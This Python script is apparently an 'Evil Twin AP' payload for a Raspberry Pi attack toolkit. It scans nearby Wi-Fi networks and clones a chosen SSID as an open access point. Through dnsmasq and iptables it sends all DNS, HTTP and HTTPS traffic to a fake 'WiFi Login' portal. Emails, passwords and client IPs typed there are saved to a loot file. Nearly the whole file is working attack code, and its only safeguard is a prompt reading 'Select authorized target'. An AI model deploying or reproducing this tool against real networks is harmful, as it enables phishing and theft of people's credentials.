#!/usr/bin/env python3
# @active: true
# @name: Evil Twin AP
# @desc: Clone a target AP to lure clients into connecting.
# @category: wifi
# @danger: true
# @inputs: [{"name":"seconds","label":"Run duration","type":"number","default":"300"}]

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces, supports_monitor
from payloads._web_input import request_input


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ["CITYPOP_LOOT"], "EvilTwin")
os.makedirs(LOOT_DIR, exist_ok=True)

HOSTAPD_CONF = "/tmp/raspyjack_evil_twin_hostapd.conf"
DNSMASQ_CONF = "/tmp/raspyjack_evil_twin_dnsmasq.conf"
PORTAL_PORT = 80
GATEWAY_IP = "10.0.66.1"
DHCP_RANGE_START = "10.0.66.10"
DHCP_RANGE_END = "10.0.66.250"
DHCP_LEASE = "12h"
ROWS_VISIBLE = 7

# ---------------------------------------------------------------------------
# WiFi interface helpers
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find the first USB WiFi interface (skip onboard)."""
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if not supports_monitor(name):
                continue
            return name
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
ap_list = []           # list of dicts: {ssid, bssid, channel, signal}
scroll_pos = 0
selected_idx = -1
attack_running = False
credentials = []       # list of dicts: {timestamp, email, password}
clients_connected = 0
status_msg = "Idle"
view_mode = "scan"     # scan | attack | creds

# Subprocesses to clean up
_hostapd_proc = None
_dnsmasq_proc = None
_portal_server = None
_iface = None
_original_iface_state = None

# ---------------------------------------------------------------------------
# AP scanning
# ---------------------------------------------------------------------------

def _set_monitor_mode(iface):
    """Put interface into monitor mode."""
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "monitor"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _set_managed_mode(iface):
    """Put interface back into managed mode."""
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "managed"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _scan_aps(iface):
    """Scan for APs using iw scan, return list of dicts."""
    _set_managed_mode(iface)
    time.sleep(0.5)
    try:
        result = subprocess.run(
            ["sudo", "iw", "dev", iface, "scan"],
            capture_output=True, text=True, timeout=30,
        )
        raw = result.stdout
    except Exception:
        return []

    aps = []
    current = {}
    for line in raw.splitlines():
        line = line.strip()
        if line.startswith("BSS "):
            if current.get("bssid"):
                aps.append(dict(current))
            match = re.match(r"BSS ([0-9a-f:]+)", line)
            current = {
                "bssid": match.group(1) if match else "??",
                "ssid": "",
                "channel": 0,
                "signal": -100,
            }
        elif line.startswith("SSID:"):
            current["ssid"] = line.split(":", 1)[1].strip()
        elif line.startswith("signal:"):
            try:
                current["signal"] = float(line.split(":")[1].strip().split()[0])
            except (ValueError, IndexError):
                pass
        elif line.startswith("DS Parameter set: channel"):
            try:
                current["channel"] = int(line.rsplit(" ", 1)[1])
            except (ValueError, IndexError):
                pass
    if current.get("bssid"):
        aps.append(dict(current))

    # Filter empty SSIDs, sort by signal
    aps = [a for a in aps if a["ssid"]]
    aps.sort(key=lambda a: a["signal"], reverse=True)
    return aps


def do_scan():
    """Background scan thread."""
    global ap_list, scroll_pos, status_msg, view_mode
    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi found"
        return
    with lock:
        status_msg = "Scanning..."
        view_mode = "scan"
    found = _scan_aps(iface)
    with lock:
        ap_list = found
        scroll_pos = 0
        status_msg = f"Found {len(found)} APs"


# ---------------------------------------------------------------------------
# hostapd + dnsmasq configuration
# ---------------------------------------------------------------------------

def _write_hostapd_conf(iface, ssid, channel):
    """Write hostapd configuration to clone the target AP."""
    conf = (
        f"interface={iface}\n"
        f"driver=nl80211\n"
        f"ssid={ssid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        f"wmm_enabled=0\n"
        f"auth_algs=1\n"
        f"wpa=0\n"
        f"ignore_broadcast_ssid=0\n"
    )
    with open(HOSTAPD_CONF, "w") as f:
        f.write(conf)


def _write_dnsmasq_conf(iface):
    """Write dnsmasq configuration for DHCP and DNS redirect."""
    conf = (
        f"interface={iface}\n"
        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{DHCP_LEASE}\n"
        f"dhcp-option=3,{GATEWAY_IP}\n"
        f"dhcp-option=6,{GATEWAY_IP}\n"
        f"address=/#/{GATEWAY_IP}\n"
        f"no-resolv\n"
        f"log-queries\n"
        f"log-facility=/tmp/raspyjack_evil_twin_dns.log\n"
    )
    with open(DNSMASQ_CONF, "w") as f:
        f.write(conf)


# ---------------------------------------------------------------------------
# Captive portal
# ---------------------------------------------------------------------------

PORTAL_HTML = """<!DOCTYPE html>
<html>
<head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px
rgba(0,0,0,.15);max-width:360px;width:90%}
h2{color:#333;margin-top:0}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;
border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0066cc;color:#fff;border:none;
border-radius:4px;cursor:pointer;font-size:16px}
button:hover{background:#0055aa}
.note{color:#888;font-size:12px;margin-top:12px}
</style></head>
<body>
<div class="box">
<h2>WiFi Authentication Required</h2>
<p>Please sign in to access the network.</p>
<form method="POST" action="/login">
<input name="email" type="email" placeholder="Email address" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<p class="note">By signing in you agree to the terms of service.</p>
</div>
</body></html>"""

PORTAL_SUCCESS = """<!DOCTYPE html>
<html><head><title>Connected</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:Arial,sans-serif;text-align:center;padding:60px}
</style></head>
<body><h2>Connected!</h2><p>You are now online.</p></body></html>"""


class PortalHandler(BaseHTTPRequestHandler):
    """HTTP handler for captive portal."""

    def log_message(self, format, *args):
        pass  # suppress console output

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(PORTAL_HTML.encode())

    def do_POST(self):
        content_len = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_len).decode("utf-8", errors="replace")
        params = parse_qs(body)
        email = params.get("email", [""])[0]
        password = params.get("password", [""])[0]

        if email or password:
            cred = {
                "timestamp": datetime.now().isoformat(),
                "email": email,
                "password": password,
                "ip": self.client_address[0],
            }
            with lock:
                credentials.append(cred)
            _save_credential(cred)

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(PORTAL_SUCCESS.encode())


def _save_credential(cred):
    """Append a credential to the loot file."""
    ts = datetime.now().strftime("%Y%m%d")
    path = os.path.join(LOOT_DIR, f"creds_{ts}.json")
    existing = []
    if os.path.isfile(path):
        try:
            with open(path, "r") as f:
                existing = json.load(f)
        except Exception:
            existing = []
    existing.append(cred)
    with open(path, "w") as f:
        json.dump(existing, f, indent=2)


# ---------------------------------------------------------------------------
# iptables
# ---------------------------------------------------------------------------

def _setup_iptables(iface):
    """Configure NAT and DNS redirect."""
    cmds = [
        ["sudo", "iptables", "-t", "nat", "-F"],
        ["sudo", "iptables", "-F"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "tcp", "--dport", "80",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "tcp", "--dport", "443",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "udp", "--dport", "53",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:53"],
        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-j", "MASQUERADE"],
        ["sudo", "sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
    ]
    for cmd in cmds:
        subprocess.run(cmd, capture_output=True, timeout=5)


def _teardown_iptables():
    """Remove iptables rules."""
    cmds = [
        ["sudo", "iptables", "-t", "nat", "-F"],
        ["sudo", "iptables", "-F"],
        ["sudo", "sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"],
    ]
    for cmd in cmds:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Attack start / stop
# ---------------------------------------------------------------------------

def _start_attack(target_ap):
    """Launch the evil twin: hostapd + dnsmasq + portal."""
    global _hostapd_proc, _dnsmasq_proc, _portal_server
    global attack_running, status_msg, view_mode

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi"
        return

    ssid = target_ap["ssid"]
    channel = target_ap.get("channel", 6) or 6

    with lock:
        status_msg = "Configuring AP..."
        view_mode = "attack"

    # Switch to managed mode and assign IP
    _set_managed_mode(iface)
    time.sleep(0.5)
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface],
                   capture_output=True, timeout=5)
    subprocess.run(
        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
        capture_output=True, timeout=5,
    )
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)

    # Write configs
    _write_hostapd_conf(iface, ssid, channel)
    _write_dnsmasq_conf(iface)

    # Kill existing instances
    for proc_name in ("hostapd", "dnsmasq"):
        subprocess.run(["sudo", "killall", proc_name],
                       capture_output=True, timeout=5)
    time.sleep(0.3)

    # Start hostapd
    with lock:
        status_msg = "Starting hostapd..."
    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1.5)

    if _hostapd_proc.poll() is not None:
        stderr = _hostapd_proc.stderr.read().decode(errors="replace")
        with lock:
            status_msg = f"hostapd fail: {stderr[:20]}"
        return

    # Start dnsmasq
    with lock:
        status_msg = "Starting dnsmasq..."
    _dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "-d"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(0.5)

    # Setup iptables
    _setup_iptables(iface)

    # Start captive portal
    with lock:
        status_msg = "Starting portal..."
    try:
        _portal_server = HTTPServer(("0.0.0.0", PORTAL_PORT), PortalHandler)
        _portal_server.timeout = 1
        threading.Thread(target=_portal_serve_loop, daemon=True).start()
    except OSError as exc:
        with lock:
            status_msg = f"Portal err: {str(exc)[:18]}"
        return

    with lock:
        attack_running = True
        status_msg = f"AP '{ssid}' live"


def _portal_serve_loop():
    """Serve portal requests in a loop."""
    while True:
        with lock:
            if not attack_running:
                break
        try:
            if _portal_server:
                _portal_server.handle_request()
        except Exception:
            break


def _stop_attack():
    """Stop all attack processes and clean up."""
    global _hostapd_proc, _dnsmasq_proc, _portal_server
    global attack_running, status_msg

    with lock:
        attack_running = False
        status_msg = "Stopping..."

    # Kill hostapd
    if _hostapd_proc is not None:
        try:
            _hostapd_proc.terminate()
            _hostapd_proc.wait(timeout=3)
        except Exception:
            try:
                _hostapd_proc.kill()
            except Exception:
                pass
        _hostapd_proc = None

    # Kill dnsmasq
    if _dnsmasq_proc is not None:
        try:
            _dnsmasq_proc.terminate()
            _dnsmasq_proc.wait(timeout=3)
        except Exception:
            try:
                _dnsmasq_proc.kill()
            except Exception:
                pass
        _dnsmasq_proc = None

    # Kill any remaining instances
    for proc_name in ("hostapd", "dnsmasq"):
        subprocess.run(["sudo", "killall", "-9", proc_name],
                       capture_output=True, timeout=5)

    # Stop portal
    if _portal_server is not None:
        try:
            _portal_server.server_close()
        except Exception:
            pass
        _portal_server = None

    # Teardown iptables
    _teardown_iptables()

    # Restore interface
    if _iface:
        _set_managed_mode(_iface)
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", _iface],
                       capture_output=True, timeout=5)

    # Clean temp files
    for fpath in (HOSTAPD_CONF, DNSMASQ_CONF):
        try:
            os.remove(fpath)
        except OSError:
            pass

    with lock:
        status_msg = "Stopped"


# ---------------------------------------------------------------------------
# Client counting
# ---------------------------------------------------------------------------

def _count_clients():
    """Count DHCP leases (connected clients)."""
    lease_file = "/var/lib/misc/dnsmasq.leases"
    try:
        if os.path.isfile(lease_file):
            with open(lease_file, "r") as f:
                return len([l for l in f.readlines() if l.strip()])
    except Exception:
        pass
    return 0



def main():
    global _iface
    choices = [{"value": x["name"], "label": x["name"]} for x in list_interfaces("wifi") if x.get("supports_monitor")]
    if not choices: print("No monitor-capable Wi-Fi interface found", flush=True); return 1
    _iface = str(request_input("Select Wi-Fi interface", input_type="select", choices=choices))
    duration = min(3600, max(10, int(sys.argv[1]) if len(sys.argv)>1 else 300))
    try:
        do_scan()
        if not ap_list: print("No access points found", flush=True); return 0
        opts=[{"value":str(i),"label":f"{a['ssid']} · {a['bssid']} · ch {a['channel']}"} for i,a in enumerate(ap_list)]
        target=ap_list[int(request_input("Select authorized target", input_type="select", choices=opts))]
        _start_attack(target); print(f"Evil twin active for {duration}s", flush=True)
        end=time.time()+duration
        while time.time()<end and attack_running: print(f"credentials={len(credentials)}", flush=True); time.sleep(5)
        return 0
    finally: _stop_attack()

if __name__ == "__main__":
    raise SystemExit(main())
